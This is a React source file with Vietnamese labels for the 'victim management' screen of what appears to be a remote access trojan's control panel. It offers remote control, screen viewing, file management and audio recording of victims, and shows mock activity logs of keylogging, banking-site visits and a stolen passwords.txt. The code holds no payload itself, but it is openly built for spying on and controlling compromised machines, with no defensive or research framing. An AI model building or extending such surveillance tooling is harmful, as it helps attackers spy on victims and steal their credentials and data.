/**
 * Victim Management Modal Component
 * Modal tổng hợp cho quản lý victim với các tab khác nhau
 */

import React, { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Button } from "../ui/button";
import { Badge } from "../ui/badge";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  Monitor,
  Terminal,
  Folder,
  Camera,
  Mic,
  Eye,
  Settings,
  Activity,
  Globe,
  MapPin,
  Clock,
  Cpu,
  HardDrive,
  Wifi,
} from "lucide-react";
import DirectControlPanel from "./DirectControlPanel";
import VictimScreenViewer from "./VictimScreenViewer";
import VictimFileManager from "./VictimFileManager";
import toast from "react-hot-toast";

const VictimManagementModal = ({ victim, isOpen, onClose }) => {
  const [activeTab, setActiveTab] = useState("control");

  if (!isOpen || !victim) return null;

  const tabs = [
    { id: "control", label: "Điều khiển", icon: Terminal },
    { id: "screen", label: "Màn hình", icon: Monitor },
    { id: "files", label: "File Manager", icon: Folder },
    { id: "info", label: "Thông tin", icon: Settings },
  ];

  const renderTabContent = () => {
    switch (activeTab) {
      case "control":
        return <DirectControlPanel victimId={victim.id} />;
      case "screen":
        return <VictimScreenViewer victimId={victim.id} />;
      case "files":
        return <VictimFileManager victimId={victim.id} onClose={() => {}} />;
      case "info":
        return <VictimInfoPanel victim={victim} />;
      default:
        return null;
    }
  };

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
        onClick={onClose}
      >
        <motion.div
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          exit={{ scale: 0.9, opacity: 0 }}
          className="bg-gradient-to-br from-slate-900/95 to-slate-800/95 border border-slate-700 rounded-xl shadow-2xl w-full max-w-7xl h-[90vh] flex flex-col"
          onClick={(e) => e.stopPropagation()}
        >
          {/* Header */}
          <div className="flex items-center justify-between p-6 border-b border-slate-700">
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-3">
                <div className="relative">
                  <div
                    className={`w-4 h-4 rounded-full ${
                      victim.status === "online" ? "bg-green-500" : "bg-red-500"
                    }`}
                  />
                  {victim.status === "online" && (
                    <div className="absolute inset-0 w-4 h-4 rounded-full bg-green-500 animate-ping opacity-75" />
                  )}
                </div>
                <div>
                  <h2 className="text-xl font-bold text-white">
                    Victim Management - {victim.id}
                  </h2>
                  <div className="flex items-center gap-4 text-sm text-slate-400">
                    <span
                      className="flex items-center gap-1"
                      aria-hidden="true"
                    >
                      <Globe className="h-3 w-3" />
                      {victim.ip}
                    </span>
                    <span className="flex items-center gap-1">
                      <MapPin className="h-3 w-3" />
                      {victim.location}
                    </span>
                    <span className="flex items-center gap-1">
                      <Clock className="h-3 w-3" />
                      {victim.lastSeen}
                    </span>
                  </div>
                </div>
              </div>

              <div className="flex gap-2">
                <Badge
                  className={`${
                    victim.status === "online"
                      ? "bg-green-500/20 text-green-400"
                      : "bg-red-500/20 text-red-400"
                  }`}
                  aria-label={`status:${victim.status}`}
                >
                  {victim.status}
                </Badge>
                <Badge className="bg-blue-500/20 text-blue-400">
                  {victim.os}
                </Badge>
                <Badge className="bg-purple-500/20 text-purple-400">
                  {victim.browser}
                </Badge>
              </div>
            </div>

            <Button
              variant="ghost"
              size="sm"
              onClick={onClose}
              className="text-slate-400 hover:text-white"
              aria-label="✕"
            >
              <X className="h-5 w-5" />
              <span className="sr-only">✕</span>
            </Button>
          </div>

          {/* Tabs */}
          <div className="flex border-b border-slate-700">
            {tabs.map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`
                    flex items-center gap-2 px-6 py-3 text-sm font-medium transition-colors
                    ${
                      activeTab === tab.id
                        ? "text-blue-400 border-b-2 border-blue-400 bg-blue-500/10"
                        : "text-slate-400 hover:text-white hover:bg-slate-800/50"
                    }
                  `}
                >
                  <Icon className="h-4 w-4" />
                  {tab.label}
                </button>
              );
            })}
          </div>

          {/* Content */}
          <div className="flex-1 overflow-hidden">
            <AnimatePresence mode="wait">
              <motion.div
                key={activeTab}
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.2 }}
                className="h-full"
              >
                {renderTabContent()}
              </motion.div>
            </AnimatePresence>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
};

// Victim Info Panel Component
const VictimInfoPanel = ({ victim }) => {
  const systemInfo = {
    cpu: "Intel Core i7-10700K @ 3.80GHz",
    ram: "16 GB DDR4",
    storage: "512 GB SSD + 1 TB HDD",
    gpu: "NVIDIA GeForce RTX 3070",
    network: "Ethernet 1 Gbps",
    uptime: "2 days, 14 hours, 32 minutes",
  };

  const networkInfo = {
    publicIp: victim.ip,
    privateIp: "192.168.1.105",
    mac: "00:1B:44:11:3A:B7",
    gateway: "192.168.1.1",
    dns: "8.8.8.8, 8.8.4.4",
    speed: "100 Mbps",
  };

  const securityInfo = {
    antivirus: "Windows Defender",
    firewall: "Enabled",
    uac: "Enabled",
    updates: "Up to date",
    encryption: "BitLocker Disabled",
    lastScan: "2024-01-15 14:30",
  };

  return (
    <div className="p-6 space-y-6 h-full overflow-y-auto">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* System Information */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <Cpu className="h-5 w-5 text-blue-400" />
              Thông tin hệ thống
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            {Object.entries(systemInfo).map(([key, value]) => (
              <div key={key} className="flex justify-between items-center">
                <span className="text-slate-400 capitalize">{key}:</span>
                <span className="text-white text-sm">{value}</span>
              </div>
            ))}
          </CardContent>
        </Card>

        {/* Network Information */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <Wifi className="h-5 w-5 text-green-400" />
              Thông tin mạng
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            {Object.entries(networkInfo).map(([key, value]) => (
              <div key={key} className="flex justify-between items-center">
                <span className="text-slate-400 capitalize">
                  {key.replace(/([A-Z])/g, " $1")}:
                </span>
                <span className="text-white text-sm font-mono">{value}</span>
              </div>
            ))}
          </CardContent>
        </Card>

        {/* Security Information */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <Eye className="h-5 w-5 text-yellow-400" />
              Thông tin bảo mật
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            {Object.entries(securityInfo).map(([key, value]) => (
              <div key={key} className="flex justify-between items-center">
                <span className="text-slate-400 capitalize">
                  {key.replace(/([A-Z])/g, " $1")}:
                </span>
                <span
                  className={`text-sm ${
                    value.includes("Enabled") || value.includes("Up to date")
                      ? "text-green-400"
                      : value.includes("Disabled")
                      ? "text-red-400"
                      : "text-white"
                  }`}
                >
                  {value}
                </span>
              </div>
            ))}
          </CardContent>
        </Card>

        {/* Activity Monitor */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-white">
              <Activity className="h-5 w-5 text-purple-400" />
              Hoạt động gần đây
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <div className="space-y-2 text-sm">
              <div className="flex items-center gap-2 text-slate-300">
                <div className="w-2 h-2 bg-green-400 rounded-full" />
                <span>Đăng nhập thành công - 15:30</span>
              </div>
              <div className="flex items-center gap-2 text-slate-300">
                <div className="w-2 h-2 bg-blue-400 rounded-full" />
                <span>Truy cập banking.com - 15:25</span>
              </div>
              <div className="flex items-center gap-2 text-slate-300">
                <div className="w-2 h-2 bg-yellow-400 rounded-full" />
                <span>Tải file passwords.txt - 15:20</span>
              </div>
              <div className="flex items-center gap-2 text-slate-300">
                <div className="w-2 h-2 bg-purple-400 rounded-full" />
                <span>Chụp màn hình - 15:15</span>
              </div>
              <div className="flex items-center gap-2 text-slate-300">
                <div className="w-2 h-2 bg-red-400 rounded-full" />
                <span>Keylogger bắt đầu - 15:10</span>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Quick Actions */}
      <Card className="bg-slate-800/50 border-slate-700">
        <CardHeader>
          <CardTitle className="text-white">Thao tác nhanh</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            <Button
              variant="outline"
              className="flex items-center gap-2"
              onClick={() => toast.success("Khởi động lại victim")}
            >
              <Settings className="h-4 w-4" />
              Restart
            </Button>
            <Button
              variant="outline"
              className="flex items-center gap-2"
              onClick={() => toast.success("Tắt victim")}
            >
              <X className="h-4 w-4" />
              Shutdown
            </Button>
            <Button
              variant="outline"
              className="flex items-center gap-2"
              onClick={() => toast.success("Chụp màn hình")}
            >
              <Camera className="h-4 w-4" />
              Screenshot
            </Button>
            <Button
              variant="outline"
              className="flex items-center gap-2"
              onClick={() => toast.success("Bật ghi âm")}
            >
              <Mic className="h-4 w-4" />
              Record Audio
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default VictimManagementModal;
